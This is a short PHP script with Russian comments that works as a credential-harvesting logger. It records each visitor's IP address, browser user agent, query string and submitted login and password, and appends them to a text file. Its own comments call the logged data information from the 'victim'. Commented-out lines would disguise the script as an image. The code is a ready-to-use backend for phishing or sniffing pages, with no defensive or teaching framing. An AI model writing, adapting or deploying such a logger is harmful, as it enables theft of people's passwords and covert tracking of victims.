<?
$file="file2.txt";
$data=date("d.m.Y H:i"); //в скобках прописан формат отображения даты D - день недели, M - месяц Y - год. 
//$time=date("h:i"); //в скобках прописан формат отображения времени h - часы, i - минуты 
$ip=trim($_SERVER['REMOTE_ADDR']);   
$sysinfo=trim($_SERVER['HTTP_USER_AGENT']);
$query=$_SERVER['QUERY_STRING'];
$login = $_POST[login];
$pass = $_POST[pass];
if(is_file($file)){ //Проверяем наличие файла и возможность работы с ним 
$fo=fopen($file,"a+"); //Открываем файл на запись в конец 
$res="\n$data  |  $ip  |  $sysinfo | \n$query \n$login  | $pass \n"; //Формируем строку с информацией от жертвы 
//в формате дата|время|ip-адрес|характеристика системы 
//Header("Content-type: image/png"); 
//$im = ImageCreateFromGif("jpg.jpg"); 
//ImageGif($im); 
//ImageDestroy($im); 
$fw=fwrite($fo,$res); //Записываем в файл 
fclose($fo); //Закрываем файл 
} 
?>